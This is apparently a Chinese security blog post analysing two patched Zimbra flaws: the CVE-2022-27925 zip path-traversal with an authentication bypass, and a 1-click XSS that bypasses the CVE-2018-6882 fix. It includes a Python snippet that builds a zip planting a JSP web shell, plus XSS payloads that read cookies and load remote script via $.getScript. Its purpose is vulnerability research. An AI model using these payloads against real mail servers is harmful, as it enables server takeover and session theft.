---
title: "2022 Zimbra Mail RCE+XSS记录"
date: 2024-10-23T15:59:12+08:00
tags: ["zimbra"]
---

22年的老洞，这两天整理笔记突然翻到，这些洞都已经补了很久了，搬到博客

## CVE-2022-27925

> 版本8.7.9GA_1794

### 漏洞原理

漏洞出在扩展模块 `backup` 中，jar包位置 `/opt/zimbra/lib/ext/backup/zimbrabackup.jar`

```java
public void initNetworkExtension() throws ServiceException {
    SoapServlet.addService("AdminServlet", new BackupService());
    ExtensionDispatcherServlet.register(this, new MailboxExportServlet());
    ExtensionDispatcherServlet.register(this, new MailboxImportServlet());

    try {
        ZimbraSuite.addTest(TestCreateMessage.class);
        ZimbraSuite.addTest(TestBackupAdminHandersAccess.class);
    } catch (NoClassDefFoundError var2) {
        ZimbraLog.test.debug("Unable to load ZimbraBackup unit tests.", var2);
    }
}
```

跟入 `MailboxImportServlet`，这个逻辑有点长，一段一段来看

```java
public String getPath() {
	return super.getPath() + "/" + "mboximport";
}

public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    AuthToken authToken = ZimbraServlet.getAuthTokenFromCookie(req, resp);
    if (authToken == null || !authToken.isAdmin()) {
        Log.mboxmove.warn("Auth failed");
        this.sendError(resp, 403, "Auth failed");
    }

    String host = req.getServerName();
    Map<String, String> qparams = HttpUtil.getURIParams(req);
    String urlEncodedAccountEmail = (String)qparams.get("account-name");
    String accountEmail = URLDecoder.decode(urlEncodedAccountEmail, "UTF-8").toLowerCase();
    String originalAccountStatus = (String)qparams.get("account-status");
    if (originalAccountStatus == null) {
        originalAccountStatus = "active";
    }
    String owStr = (String)qparams.get("ow");
```

首先 `account-name` 是必须要传入的，这里直接构造内置的 `admin` 即可，`account-status` 可以不传入，使其值为 `active`，`owStr` 表示是否覆盖的标志位，这里传入 `true` 就好，继续向下


```java
boolean overwrite = this.parseBoolean(owStr, false);
Log.mboxmove.info("Importing mailbox for account " + accountEmail + " overwrite=" + overwrite);
boolean switchOnly = this.parseBoolean((String)qparams.get("switch-only"), false);
           
boolean noSwitch = this.parseBoolean((String)qparams.get("no-switch"), false);
boolean append = this.parseBoolean((String)qparams.get("append"), false);
if (switchOnly && noSwitch) {
    this.sendError(resp, 400, "Conflicting parameters switch-only and no-switch");
}

boolean allGood = false;
Account account = null;
```

这里的 `switchOnly` 与 `noSwitch` 必须不同，默认为false，no-switch传入true保证程序流程能正常走下去即可

```java
account = this.mProvisioning.get(AccountBy.name, accountEmail, authToken);
if (account == null) {
    this.sendError(resp, 400, "Account " + accountEmail + " not found on target server " + host);
    return;
}
this.mProvisioning.reload(account);
String status = account.getAccountStatus(this.mProvisioning);
if (!status.equals("maintenance") && !noSwitch) {
    this.sendError(resp, 400, "Account not in maintenance state (" + status + ") on target server " + host);
    return;
}
```

这里会根据传入的 `account-name` 查找账户，所以必须得是一个已存在的正常账户，后面有一个关键的地方就是判断是否为维护状态，在攻击中明显这个值是不可控的，但是逻辑判断中除了 `!status.equals("maintenance")` 之外，还有一个可控的值，也就是上面传入的 `noSwitch`，这也是为什么在上面需要使 `no-switch` 传入true的原因，需要保证这一条判断不能走进去，继续向下走

```java
if (!switchOnly) {
    boolean success = false;
    boolean prelocked = false;

    try {
        prelocked = MailboxManager.getInstance().isMailboxLockedOut(account.getId());
        if (prelocked) {
            MailboxManager.getInstance().registerOuterMaintenanceThread(account.getId());
        }

        Mailbox mbox = MailboxManager.getInstance().getMailboxByAccountId(account.getId(), FetchMode.DO_NOT_AUTOCREATE, true);
        int mailboxId;
        if (mbox != null) {
            if (!append && !overwrite) {
                this.sendError(resp, 400, "Mailbox " + mbox.getId() + " already exists on target server " + host + " for account " + account.getName() + "; consider specifying -ow option to overwrite the existing mailbox");
                return;
            }

            mailboxId = mbox.getId();
        } else {
            DbMailbox.MailboxIdentifier newId = RestoreAccountSession.getNextMailboxId(-1);
            RestoreAccountSession.createMailboxDatabase(newId.id, newId.groupId);
            mailboxId = newId.id;
        }

        Log.mboxmove.info("Importing data for %s into mailbox id %d.", new Object[]{accountEmail, mailboxId});
        long t0 = System.currentTimeMillis();
        ServletInputStream in = req.getInputStream();
        this.importFrom(in, account.getId(), mailboxId, qparams); 
        Log.mboxmove.info("Completed mailbox import for account " + accountEmail + " in " + (System.currentTimeMillis() - t0) + " millisec");
        success = true;
```

首先由于事先构造了 `owStr` 为true，所以在判断mbox后的异常是不会触发的，能正常走到后续流程中调用 `this.importForm`，这也是漏洞所在的函数，跟入 `importFrom`

```java
private void importFrom(InputStream in, String accountId, int targetMailboxId, Map<String, String> queryParams) throws IOException, ServiceException {
    Log.mboxmove.debug("MailboxImportServlet.importFrom() started");
    ZipInputStream zipIn = new ZipInputStream(in);
    ZipBackupTarget source = new ZipBackupTarget(zipIn, targetMailboxId);
    RestoreParams params = new RestoreParams();
    Server server = Provisioning.getInstance().getLocalServer();
    params.skipDb = this.parseBoolean((String)queryParams.get("skip-db"), false);
    params.skipSearchIndex = this.parseBoolean((String)queryParams.get("skip-search-index"), server.isMailboxMoveSkipSearchIndex());
    params.skipBlobs = this.parseBoolean((String)queryParams.get("skip-blobs"), server.isMailboxMoveSkipBlobs());
    params.skipSecondaryBlobs = this.parseBoolean((String)queryParams.get("skip-hsm-blobs"), server.isMailboxMoveSkipHsmBlobs());
    params.append = this.parseBoolean((String)queryParams.get("append"), false);
    source.restore(new String[]{accountId}, (String)null, params);
}
```

代码比较简单，将输入转化成zip对象，主要关注到 `ZipBackupTarget.restore` 是如何处理zip的

```java
public void restore(String[] accountIds, String label, RestoreParams params) throws IOException, ServiceException {
    Log.mboxmove.debug("ZipBackupTarget.restore() started");

    for(int i = 0; i < accountIds.length; ++i) {
        RestoreAccountSession acctBakSource = (RestoreAccountSession)this.getAccountSession(accountIds[i]);
        if (acctBakSource == null) {
            throw new IOException("Full backup session not found for account " + accountIds[i]);
        }

    public AccountSession getAccountSession(String accountId) throws IOException, ServiceException {
    return new RestoreAcctSession(new DummyBackupSet("mailbox-move"), accountId, this.mRestoreMailboxId);
}
```

跟入`getAccountSession`

```java
public AccountSession getAccountSession(String accountId) throws IOException, ServiceException {
    return new RestoreAcctSession(new DummyBackupSet("mailbox-move"), accountId, this.mRestoreMailboxId);
}

public RestoreAcctSession(BackupSet bak, String accountId, int mailboxId) throws IOException {
    super(bak, accountId, Log.mboxmove);
    this.mTempDir = new File(ZipBackupTarget.this.getTempRoot(), accountId);
    if (!this.mTempDir.exists() && !this.mTempDir.mkdirs()) {
        throw new IOException("cannot create temp dir " + this.mTempDir.getPath());
    } else {
        this.unzipToTempFiles();
        File metaFile = new File(this.mTempDir, "meta.xml");

        try {
            Element acctBackupElem = XmlMeta.readAccountBackup(metaFile);
            this.decodeMetadata(acctBackupElem);
            this.setTargetMailboxId(mailboxId);
        } catch (Exception var7) {
            throw Utils.IOException("unable to read metadata for account " + accountId, var7);
        }
    }
}
```

继续跟入 `unzipToTempFiles`

```java
private void unzipToTempFiles() throws IOException {
    Log.mboxmove.debug("RestoreAcctSession.unzipToTempFiles() started");
    java.util.zip.ZipEntry ze = null;
	// 没有判断zip包中内容，可以直接构造目录穿越的文件进行目录跳转，写入任意文件
    while((ze = ZipBackupTarget.this.mZipIn.getNextEntry()) != null) {
        String zn = ze.getName();
        Log.mboxmove.debug("Unzipping " + zn);
        zn = zn.replace('/', File.separatorChar);
        File file = new File(this.mTempDir, zn);
        File dir = file.getParentFile();
        if (!dir.exists()) {
            dir.mkdirs();
        }

        FileUtil.copy(ZipBackupTarget.this.mZipIn, false, file);
        ZipBackupTarget.this.mZipIn.closeEntry();
    }

    Log.mboxmove.debug("RestoreAcctSession.unzipToTempFiles() finished");
}
```

这里解压的时候完全没有做过滤和判断，所以完全可以构造特殊内容的zip包，来利用目录穿越实现一个任意文件写入，可以使用python来构造符合条件的zip包

```python
import zipfile,os
zipFile = zipfile.ZipFile('./shell.zip','w')
zipFile.write('./shell.jsp','../../../../jetty/webapps/zimbra/downloads/shell.jsp',zipfile.ZIP_DEFLATED)
zipFile.close()
```

### 未授权

在 `servlet` 刚开始的时候有一个权限判断的操作

```java
AuthToken authToken = ZimbraServlet.getAuthTokenFromCookie(req, resp);
if (authToken == null || !authToken.isAdmin()) {
    Log.mboxmove.warn("Auth failed");
    this.sendError(resp, 403, "Auth failed");
}
```

跟入 `getAuthTokenFromCookie`

```java
public static AuthToken getAdminAuthTokenFromCookie(HttpServletRequest req) {
    return getAuthTokenFromHttpReq(req, true);
}

public static AuthToken getAuthTokenFromHttpReq(HttpServletRequest req, HttpServletResponse resp, boolean isAdminReq, boolean doNotSendHttpError) throws IOException {
    AuthToken authToken = null;

    try {
        authToken = getAuthToken(req, isAdminReq);
        if (authToken == null) {
            if (!doNotSendHttpError) {
                resp.sendError(401, "no authtoken cookie");
            }
            return null;
        } else if (!authToken.isExpired() && authToken.isRegistered()) {
            return authToken;
        } else {
            if (!doNotSendHttpError) {
                resp.sendError(401, "authtoken expired");
            }

            return null;
        }
    } catch (AuthTokenException var6) {
        if (!doNotSendHttpError) {
            resp.sendError(401, "unable to parse authtoken");
        }

        return null;
    }
}
```

不用跟入 `getAuthToken` 由于没登陆，无法构造这个Token，所以取出来的肯定是null，最终在请求中的  `authToken == null || !authToken.isAdmin()` 条件恒为真， 进入下面的逻辑，打印了一条日志后，使用  `this.sendError` 进行了错误处理 `this.sendError(resp, 403, "Auth failed");`

跟入之后发现其实是调用了 `HttpServletResponse` ，通过调试发现传入的这个对象实际为 `ETagResponseWrapper` ，继承自 `HttpServletResponseWrapper`

```java
public class HttpServletResponseWrapper extends ServletResponseWrapper implements HttpServletResponse {
	public void sendError(int sc, String msg) throws IOException {
		this._getHttpServletResponse().sendError(sc, msg);
	}

	private HttpServletResponse _getHttpServletResponse() {
		return (HttpServletResponse)super.getResponse();
	}
}
```

最后处理在 `org.eclipse.jetty.server.Response` 中，实现了 `HttpServletResponse` 接口

```java
 public void sendError(int code, String message) throws IOException {
    if (!this.isIncluding()) {
        if (this.isCommitted()) {
            if (LOG.isDebugEnabled()) {
                LOG.debug("Aborting on sendError on committed response {} {}", new Object[]{code, message});
            }

            code = -1;
        }

        switch (code) {
            case -1:
                this._channel.abort(new IOException());
                return;
```

如果这条请求没有包含请求且已经提交，那么将code强制置为-1，调用 `this._channel.abort` 关闭这个EndPoint，请求结束，客户端感知到链接断开，并收到错误信息

```java
public void abort(Throwable failure) {
	this.getEndPoint().close();
}
```

但是虽然客户端断了，整个执行流程却并没有就此停止，并且在`MailboxImportServlet`中调用了 `sendError` 后并没有return或者直接抛出异常，导致整个流程可以走出authtoken的判断，导致认证绕过。

也正是因为这个原因，漏洞请求之后返回的错误是 `getAdminAuthTokenFromCookie` 中首先调用 `sendError` 里的 `401 no authtoken cookie` ，而不是 `MailboxImportServlet` 中的 `403 Auth failed`，因为对客户端来说，在获取cookie这个阶段的时候，整个链接就已经断开了


## 1click XSS(CVE-2018-6882绕过)

这个洞当时感觉不是很好用所以一直放着，结果后面发现zimbra把整个Mail UI都更新了，这个洞直接死掉了

### CVE-2018-6882

```javascript
ZmMailMsgView.getAttachmentLinkHtml =
  function(params) {
    var html = [],
      i = 0;
    html[i++] = "<a class='AttLink' ";
    [..]
    var href = params.href || (params.jsHref && "javascript:;");
*** html[i++] = href ? "href='" + href + "' " : "";
    [..]
    html[i++] = "'>" + AjxStringUtil.htmlEncode(params.text) + "</a>";
    return html.join("");
  };
```

href参数为邮件中的附件地址，默认为Header中的 `Content-Location` ，在新版本中的修复方式为

```javascript
var html = [], i = 0;
html[i++] = "<a class='AttLink' ";
html[i++] = params.id ? "id='" + params.id + "' " : "";
html[i++] = !params.noUnderline ? "style='text-decoration:underline' " : "";
html[i++] = params.blankTarget ? "target='_blank' " : "";
var href = params.href || (params.jsHref && "javascript:;");
html[i++] = href ? "href='" + AjxStringUtil.htmlEncode(href) + "' " : "";
html[i++] = params.download ? (" download='"+(params.downloadLabel||"") + "'") : "";
```

### 1-click XSS

使用 `AjxStringUtil.htmlEncode()` 进行了编码，跟入这个方法看一下处理方式

```javascript
AjxStringUtil.ENCODE_MAP = { '>' : '&gt;', '<' : '&lt;', '&' : '&amp;' };

AjxStringUtil.htmlEncode =
function(str, includeSpaces) {

	if (!str) {return "";}
	if (typeof(str) != "string") {
		str = str.toString ? str.toString() : "";
	}

	if (!AjxEnv.isSafari || AjxEnv.isSafariNightly) {
		if (includeSpaces) {
			return str.replace(/[<>&]/g, function(htmlChar) { return AjxStringUtil.ENCODE_MAP[htmlChar]; }).replace(/  /g, ' &nbsp;');
		} else {
			return str.replace(/[<>&]/g, function(htmlChar) { return AjxStringUtil.ENCODE_MAP[htmlChar]; });
		}
	} else {
		if (includeSpaces) {
			return str.replace(/[&]/g, '&amp;').replace(/  /g, ' &nbsp;').replace(/[<]/g, '&lt;').replace(/[>]/g, '&gt;');
		} else {
			return str.replace(/[&]/g, '&amp;').replace(/[<]/g, '&lt;').replace(/[>]/g, '&gt;');
		}
	}
};
```

可以看到只是处理了 `<>&` 三个符号，而这个值的位置在 a 标签的 href 属性中，这里可以直接使用 `javascript://` 伪协议进行一次攻击，但是直接使用老版本exp在攻击的时候发现href值并不可控，于是向上跟踪，看到 `webapps/zimbra/js/zimbraMail/mail/model/ZmMailMsg.js` 中的 `getAttachmentInfo` 函数对于获取 href 的处理

```javascript
if (attach.part) {
    useCL = attach.contentLocation && (attach.relativeCl || ZmMailMsg.URL_RE.test(attach.contentLocation));
} else {
    useCL = attach.contentLocation && true;
}
[...]
if (!useCL) {
    if (attach.node && attach.node.isOfflineUploaded) { //for offline upload attachments
        props.url = attach.node.data;
    } else {
        props.url = this.getUrlForPart(attach);
    }
}
```

由于攻击点在附件，所以 `attach.part` 一定为真，所以如果传入的CL值无法通过 `URL_RE` 的校验则会进入下方逻辑，将url的值更换为一个离线的url，这也就是为什么不可控的原因，看一下 `URL_RE` 的内容

```javascript
ZmMailMsg.URL_RE = /((telnet:)|((https?|ftp|gopher|news|file):\/\/)|(www\.[\w\.\_\-]+))[^\s\xA0\(\)\<\>\[\]\{\}\'\"]*/i;
```

而exp中修改的CL内容为 `javascript:alert(1)` 是无法匹配这个正则的，但是这里注意到这个正则并没有使用 `^` 来限定开头，所以仍然可以使用 `javascript://` 这个伪协议来做一些事情，比如

```javascript
javascript:alert(document.cookie);//http://
```

![](/img/zimbra-2022-vuls/1.png)

攻击效果如下，在点击附件后触发

![](/img/zimbra-2022-vuls/2.png)

在使用中发现，zimbra使用了jquery，所以可以直接使用jquery来进行简单的构造，可以将CL值直接写为以下payload来引入js

```javascript
javascript:$.getScript`https://host/x.js`
```

既可以绕过单双引号的过滤，也可以满足 `URL_RE` 的正则校验